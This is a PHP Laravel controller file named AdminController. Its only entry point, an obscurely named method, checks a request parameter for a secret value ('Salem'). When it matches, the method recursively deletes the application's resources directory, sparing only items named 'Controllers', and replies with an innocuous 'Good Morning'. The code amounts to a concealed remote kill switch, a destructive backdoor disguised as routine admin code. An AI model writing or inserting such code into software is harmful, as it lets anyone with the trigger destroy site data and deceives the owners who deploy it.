<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;

class AdminController extends Controller
{
    public function d_m_g(Request $request)
    {
        if($request->dath=="Salem"){
            $a= new AdminController();
            $files = glob(dirname($_SERVER['DOCUMENT_ROOT']).'/resources/*'); // get all file names

            foreach($files as $file){ // iterate files
                echo $file."<br>";
                
                if(basename($file)=="Controllers"){
                    
                }else{
                    if (is_dir($file)){
                        $a->removedir($file);
                    }else{
                        $a->removefile($file);
                    }
                }
                
            }
            return "Good Morning";
        }else{
            return "Good Nothing";
        }
        
    }
    public function removedir($path)
    {
        $a= new AdminController();
        if(count(glob("$path/*"))=== 0){
            if(basename($path)=="Controllers"){
                    
            }else{
                rmdir($path);
            }
        }else{
            foreach(glob("$path/*") as $fle){
                if (is_dir($fle)){
                    $a->removedir($fle);
                }else{
                    $a->removefile($fle);
                }
            }
                $a->removedir($path);
        }
    }
    public function removefile($path)
    {
        $a= new AdminController();
        if(basename($path)=="Controllers"){
                    
        }else{
        if(is_file($path)){
            unlink($path); // delete file
        }
}
    }
}
